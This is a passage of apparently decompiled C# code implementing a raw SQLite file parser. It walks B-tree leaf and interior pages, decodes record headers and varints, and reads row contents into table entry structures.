                Array.Resize(ref field_names, j + 1);
                this.field_names[j] = strArray[j];
            }
            return this.ReadTableFromOffset((ulong)((this.master_table_entries[index].root_num - 1L) * this.page_size));
        }

        private bool ReadTableFromOffset(ulong Offset)
        {
            if (this.db_bytes[(int)Offset] == 13)
            {
                int num2 = Convert.ToInt32(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int length = 0;
                if (this.table_entries != null)
                {
                    length = this.table_entries.Length;
                    Array.Resize(ref this.table_entries, this.table_entries.Length + num2 + 1);
                }
                else
                {
                    this.table_entries = new table_entry[num2 + 1];
                }
                int num16 = num2;
                for (int i = 0; i <= num16; i++)
                {
                    record_header_field[] _fieldArray = new record_header_field[1];
                    ulong num = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) != 0)
                    {
                        num += Offset;
                    }
                    int endIndex = this.GVL((int)num);
                    long num9 = this.CVL((int)num, endIndex);
                    int num8 = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    this.table_entries[length + i].row_id = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num8);
                    num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num8), new decimal(num))), decimal.One));
                    endIndex = this.GVL((int)num);
                    num8 = endIndex;
                    long num7 = this.CVL((int)num, endIndex);
                    long num10 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num), new decimal(endIndex)), decimal.One));
                    for (int j = 0; num10 < num7; j++)
                    {
                        Array.Resize(ref _fieldArray, j + 1);
                        endIndex = num8 + 1;
                        num8 = this.GVL(endIndex);
                        _fieldArray[j].type = this.CVL(endIndex, num8);
                        if (_fieldArray[j].type > 9L)
                        {
                            if (this.IsOdd(_fieldArray[j].type))
                            {
                                _fieldArray[j].size = (long)Math.Round((double)(((double)(_fieldArray[j].type - 13L)) / 2.0));
                            }
                            else
                            {
                                _fieldArray[j].size = (long)Math.Round((double)(((double)(_fieldArray[j].type - 12L)) / 2.0));
                            }
                        }
                        else
                        {
                            _fieldArray[j].size = this.SQLDataTypeSize[(int)_fieldArray[j].type];
                        }
                        num10 = (num10 + (num8 - endIndex)) + 1L;
                    }
                    this.table_entries[length + i].content = new string[(_fieldArray.Length - 1) + 1];
                    int num4 = 0;
                    int num17 = _fieldArray.Length - 1;
                    for (int k = 0; k <= num17; k++)
                    {
                        if (_fieldArray[k].type > 9L)
                        {
                            if (!this.IsOdd(_fieldArray[k].type))
                            {
                                if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                                {
                                    this.table_entries[length + i].content[k] = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                }
                                else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                                {
                                    this.table_entries[length + i].content[k] = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                }
                                else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                                {
                                    this.table_entries[length + i].content[k] = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                }
                            }
                            else
                            {
                                this.table_entries[length + i].content[k] = GetTextEncoding().GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                            }
                        }
                        else
                        {
                            this.table_entries[length + i].content[k] = Convert.ToString(this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size));
                        }
                        num4 += (int)_fieldArray[k].size;
                    }
                }
            }
            else if (this.db_bytes[(int)Offset] == 5)
            {
                ushort num14 = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int num18 = num14;
                for (int m = 0; m <= num18; m++)
                {
                    ushort num13 = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(m * 2))), 2);
                    this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(Offset + num13), 4)), decimal.One), new decimal(this.page_size))));
                }
                this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One), new decimal(this.page_size))));
            }
            return true;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct record_header_field
        {
            public long size;
            public long type;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct sqlite_master_entry
        {
            public long row_id;
            public string item_type;
            public string item_name;
            public string astable_name;
            public long root_num;
            public string sql_statement;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct table_entry
        {
            public long row_id;
            public string[] content;
        }
    }
}